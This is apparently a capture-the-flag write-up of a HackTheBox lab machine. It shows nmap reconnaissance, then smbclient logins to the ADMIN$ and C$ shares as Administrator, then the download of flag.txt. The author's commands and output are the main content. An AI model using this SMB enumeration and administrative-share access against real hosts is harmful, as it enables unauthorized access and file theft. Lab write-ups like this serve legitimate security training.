## Reconnaissance

Kicking off with a simple Nmap scan...

__Nmap Scan__
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/Tactics]
└─$ sudo nmap -sC -sV -O -oN nmap.txt 10.129.36.78
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 13:31 EST
Nmap scan report for 10.129.36.78
Host is up (0.18s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|router|broadband router|proxy server|webcam|terminal|printer
Running (JUST GUESSING): AVtech embedded (98%), Linksys embedded (95%), OneAccess embedded (95%), Blue Coat embedded (95%), Polycom pSOS 1.X (95%), Wyse ThinOS 5.X (95%), Ricoh embedded (90%)
OS CPE: cpe:/h:oneaccess:1641 cpe:/h:bluecoat:packetshaper cpe:/o:polycom:psos:1.0.4 cpe:/o:wyse:thinos:5.2 cpe:/h:ricoh:aficio_sp_c240sf
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (98%), Linksys BEFSR41 EtherFast router (95%), OneAccess 1641 router (95%), Blue Coat PacketShaper appliance (95%), Polycom MGC-25 videoconferencing system (pSOS 1.0.4) (95%), Wyse ThinOS 5.2 (95%), Ricoh Aficio SP C240SF printer (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-25T18:33:40
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 2s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.29 seconds
```

Since I got 

From the results of the nmap scan, I could conclude that the machine is running the `Windows` and the `Server Message Block (SMB)` service on port `445`. Along with that, port `135` was running RPC service and port `139` was running `NetBIOS`

Out of all the services running, I found SMB the most useful one to enumerate and started enumerating it.

I used smbclient to enumerate this service.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/Tactics]
└─$ smbclient -L 10.129.36.78 -U Administrator    
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
```

I found `ADMIN$` share interesting, and went on to check it out.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/Tactics]
└─$ smbclient \\\\10.129.36.78\\ADMIN$ -U Administrator
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              

```

but there was nothing I could do, so I decided to visit the `C:` directory.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/Tactics]
└─$ smbclient \\\\10.129.36.78\\C$ -U Administrator
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Wed Apr 21 11:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 14:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 11:17:12 2021
  pagefile.sys                      AHS 738197504  Wed Jan 25 13:31:10 2023
  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
  Program Files                      DR        0  Wed Jul  7 14:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 14:03:38 2021
  ProgramData                        DH        0  Tue Sep 13 12:27:53 2022
  Recovery                         DHSn        0  Wed Apr 21 11:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 11:34:04 2021
  Users                              DR        0  Wed Apr 21 11:23:18 2021
  Windows                             D        0  Wed Jul  7 14:05:23 2021

                3774463 blocks of size 4096. 1156383 blocks available
smb: \> cd Users\Administrator\Desktop
dir
smb: \Users\Administrator\Desktop\> dir
  .                                  DR        0  Thu Apr 22 03:16:03 2021
  ..                                 DR        0  Thu Apr 22 03:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
  flag.txt                            A       32  Fri Apr 23 05:39:00 2021
get flag.
                3774463 blocks of size 4096. 1156383 blocks available
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

Once I visited the `C` share, I could see that flag, I pivoted into the directory and obtained the flag

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/Tactics]
└─$ cat flag.txt       
[REDACTED]
```

